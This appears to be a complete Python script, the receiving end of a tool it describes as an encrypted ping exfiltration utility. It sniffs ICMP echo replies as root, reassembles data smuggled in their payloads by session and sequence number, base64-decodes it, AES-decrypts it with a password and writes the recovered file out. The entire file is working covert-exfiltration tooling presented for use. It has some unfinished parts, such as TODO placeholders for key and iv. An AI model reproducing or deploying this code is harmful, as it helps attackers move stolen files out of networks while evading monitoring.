#!/usr/bin/python3

from scapy.all import sniff, ICMP
from os import getuid
from time import sleep
import sys
from base64 import b64decode
from hashlib import sha256
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import argparse

HANDSHAKE_MSG = b"wei wei"
DATA_SIZE_LEN = 4

# GLOBAL SHIT
session_id = -1
initial_seq_n = -1
data_len = -1
received_data_n = 0
received_data = dict()

def is_handshake(packet):
    h_len = len(HANDSHAKE_MSG) + DATA_SIZE_LEN
    load = packet[ICMP].load
    return len(load) == h_len and load[:len(HANDSHAKE_MSG)] == HANDSHAKE_MSG 

def process_icmp_packet(packet):
    global session_id
    global initial_seq_n
    global seq_n
    global data_len
    global received_data_n

    if packet.haslayer(ICMP) and packet[ICMP].type == 0:
        # Handle handshake
        if session_id == -1 and is_handshake(packet):
            session_id = packet[ICMP].id 
            initial_seq_n = packet[ICMP].seq
            key = '' # TODO
            iv = '' # TODO
            data_len = int.from_bytes(packet[ICMP].load[-DATA_SIZE_LEN:], byteorder='big')
            print("Received handshake (sess_id = %d, seq_n = %d, key = %s, data_len = %d)..." % (session_id, initial_seq_n, key, data_len))
        
        # Handle other packets
        elif packet[ICMP].id == session_id :
            raw_data = packet[ICMP].load
            received_data[packet[ICMP].seq] = raw_data
            received_data_n += 1
            print("Received data packet (seq_n = %d)" % packet[ICMP].seq)


def show_raw_packet(packet):
    if packet.haslayer(ICMP) and packet[ICMP].type == 0:
        packet.show()

def reassemble_b64(received_data):
    global initial_seq_n
    global data_len

    seq_n = initial_seq_n + 1
    data = b''
    for i in range(data_len):
        data += received_data[seq_n]
        seq_n = (seq_n + 1) % 65536
    
    return data.decode("utf-8")


def b64_decode(b64_data):
    return b64decode(b64_data)


def decrypt(cypher, password):
    # if no password => no encryption
    if password == '':
        return cypher
    
    key = sha256(password.encode("utf-8")).digest()
    iv = cypher[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    try:
        padded = cipher.decrypt(cypher[16:])
        unpadded = unpad(padded, 16, style='pkcs7')
    except ValueError:
        print("Invalid password or corrupted message!")
        sys.exit(0)
    return unpadded


def parse_arguments():
    parser = argparse.ArgumentParser(description="an encrypted ping exfiltration utility",prog="pingthefuckoutReceiver",)
    parser.add_argument("-o","--out",type=str,dest="out_file",required=True,help="output file",)
    parser.add_argument("-i","--interface",type=str,dest="interface",default="eth0",help="interface",)
    parser.add_argument("-p","--password",type=str,dest="password",default="",help="password used for encryption" )
    return parser.parse_args()


def threaded_sniff(interface):
    sniff(iface=interface, prn=process_icmp_packet)           


if __name__ == "__main__":
    if getuid() != 0:
        print("Please run as root user")
        exit(1)

    from threading import Thread 

    args = parse_arguments()
    sniffer = Thread(target=threaded_sniff, args=(args.interface,))
    sniffer.daemon = True
    sniffer.start()
    print("Server is running on interface: %s ..." % args.interface)

    while True:
        sleep(1)
        if received_data_n == data_len:
            # Ending procedure
            print("All data chunks were received ...")
            reassembled_b64 = reassemble_b64(received_data)
            encrypted_content = b64_decode(reassembled_b64)
            file_content = decrypt(encrypted_content, args.password)
            #print(file_content)
            with open(args.out_file, 'wb') as f:
                f.write(file_content)
            break
    
    sys.exit(0)